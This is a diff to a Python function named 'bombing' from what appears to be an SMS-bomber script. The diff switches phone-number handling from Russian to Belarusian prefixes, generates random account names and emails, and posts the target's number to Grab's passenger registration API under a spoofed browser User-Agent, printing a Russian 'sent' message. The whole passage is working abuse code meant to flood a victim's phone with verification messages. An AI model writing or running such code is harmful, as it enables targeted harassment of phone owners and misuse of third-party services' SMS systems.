@@ -72,19 +72,20 @@ def bombing():
     global name
     global iteration
     if phone[0] == '+':
-        phone = phone[1:]
+        phone = phone[3:]
     if phone[0] == '8':
-        phone = '7' + phone[1:]
+        phone = '375' + phone[3:]
     if phone[0] == '9':
-        phone = '7' + phone
+        phone = '375' + phone
     for x in range(12):
         name = name + random.choice(list('1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
         password = name + random.choice(list('1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
         username = name + random.choice(list('1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
 
-    phone9 = phone[1:]
+    phone9 = phone[3:]
     email = name+f'{iteration}'+'@gmail.com'
     email = name+f'{iteration}'+'@gmail.com'
+
     try:
         requests.post('https://p.grabtaxi.com/api/passenger/v2/profiles/register', data={'phoneNumber': phone,'countryCode': 'ID','name': 'test','email': 'mail@mail.com','deviceToken': '*'}, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36'})
         print('[+] Grab отправлено!')
